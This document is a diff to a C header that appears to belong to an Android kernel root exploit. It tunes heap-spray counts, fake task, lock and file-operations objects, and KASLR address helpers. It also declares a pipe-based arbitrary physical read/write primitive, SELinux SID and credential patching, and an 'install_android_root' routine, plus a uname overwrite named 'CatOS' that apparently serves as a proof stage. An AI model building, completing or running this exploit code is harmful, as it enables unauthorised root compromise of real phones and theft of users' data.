@@ -32,6 +32,7 @@
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/utsname.h>
 #include <sys/uio.h>
 #include <sys/wait.h>
 #include <time.h>
@@ -41,7 +42,7 @@
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 12
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
 #define SKB_DATA_DELTA (-0xe80LL)
 
 #define ASHMEM_NAME_LEN 256
@@ -62,7 +63,13 @@
 #define SKB_FRAG_BIAS 0
 
 #define FAKE_TASK_PRIO 120
-#define FAKE_WAITER_PRIO 130
+#define FAKE_WAITER_PRIO 140
+#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
+#define FAKE_TASK_UCLAMP_OFF 0x358
+#define FAKE_UCLAMP_ACTIVE_BIT 16
+#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
+#define FAKE_UCLAMP_MAX_ACTIVE \
+  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
 
@@ -115,6 +122,21 @@
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
 #define PIPE_MAX_ATTEMPTS 12
 
+#define PIPEI_DRAIN_COUNT 504
+#define PIPEI_RECLAIM_COUNT 2016
+#define PIPEI_RECLAIM_MAX_BASES 64
+#define PIPEI_PREP_ATTEMPTS 8
+#define PIPEI_LIVE_COUNT PIPEI_RECLAIM_COUNT
+#define PIPEI_LIVE_ANCHOR_SAMPLES 5
+#define PIPEI_LIVE_DEFAULT_BIASES ""
+#define PIPEI_LIVE_MAX_ATTEMPTS 32
+#define PIPEI_LIVE_MAX_CONSIDERED 0
+#define PIPEI_LIVE_SLOT_CANDIDATES 1
+#define PIPEI_LIVE_DEDUP_TARGETS 1
+#define PIPEI_LIVE_ANCHOR_MAX_SPREAD 0xfff
+#define TMP_UNAME_DEFAULT_NAME "CatOS"
+#define TMP_UNAME_DEFAULT_HOLD_SEC 5
+
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
@@ -125,10 +147,12 @@
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define PSELECT_TIMEOUT_SEC 5
-#ifndef ROUTE_WAIT_SECONDS
-#define ROUTE_WAIT_SECONDS 8
-#endif
+#define PSELECT_TIMEOUT_SEC 0
+#define PSELECT_TIMEOUT_USEC 200000
+#define SLIDE_PSELECT_TIMEOUT_SEC 1
+#define SLIDE_WAIT_SECONDS 2
+#define PSELECT_WRITE_SHAPE_DEFAULT 1
+#define ROUTE_WAIT_SECONDS 1
 #define EARLY_PIPE_PREPARE 0
 #define SLIDE_NFULNL_LOGGER \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
@@ -199,6 +223,7 @@ struct user_pipe_buffer {
 
 extern pid_t pipe_prepare_child;
 extern uintptr_t page_base;
+extern uintptr_t last_mm_struct;
 extern uintptr_t fake_lock;
 extern uintptr_t fake_w0;
 extern uintptr_t fake_task;
@@ -207,6 +232,9 @@ extern uintptr_t fake_right;
 extern uintptr_t fake_left;
 extern uintptr_t fake_fops;
 extern uintptr_t binwrite_target;
+extern int pselect_custom_write;
+extern uintptr_t pselect_custom_target;
+extern uintptr_t pselect_custom_value;
 
 extern uint32_t f_wait;
 extern uint32_t f_pi_target;
@@ -340,6 +368,8 @@ void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
 void log_slide_child_context(void);
 void disable_rseq_for_thread(void);
+int env_flag(const char *name, int def);
+int env_int_range(const char *name, int def, int min, int max);
 long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
@@ -356,6 +386,12 @@ uintptr_t kaslr_image_addr(uintptr_t image_addr);
 uintptr_t text_addr(uintptr_t image_addr);
 uintptr_t slide_canon_addr(uintptr_t data_alias);
 uintptr_t canon_addr(uintptr_t image_addr);
+uintptr_t pselect_write_value(void);
+uintptr_t pselect_write_target(void);
+int pselect_custom_write_enabled(void);
+int pselect_write_shape(void);
+void set_pselect_write(uintptr_t target, uintptr_t value);
+void clear_pselect_write(void);
 void put64(unsigned char *p, size_t off, uint64_t value);
 void put32(unsigned char *p, size_t off, uint32_t value);
 void put_fake_fops_table(unsigned char *p, size_t off);
@@ -368,6 +404,7 @@ int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
 void setup_kernelsnitch(void);
+int kernelsnitch_collision_count(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
 uintptr_t current_kernelsnitch_mm_struct(void);
@@ -387,6 +424,8 @@ void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
+void reset_main_route_state(void);
+void run_main_route_threads(void);
 
 int slide_pselect_words_per_set(void);
 int slide_pselect_global_word(int waiter_word);
@@ -457,6 +496,8 @@ uint64_t pipe_read64(int fd, uintptr_t direct_addr);
 uint32_t pipe_read32(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
+void print_uname_line(const char *tag);
+int run_tmp_page_uname_stage(void);
 
 int spawn_root_child(void);
 int collect_root_child(void);
@@ -466,10 +507,6 @@ int patch_cred_sid(int fd, uintptr_t cred);
 int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
 
-
-/* Target-specific config */
-#ifdef TARGET_CONFIG_H
-#include TARGET_CONFIG_H
 #endif
 
-#endif
+void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
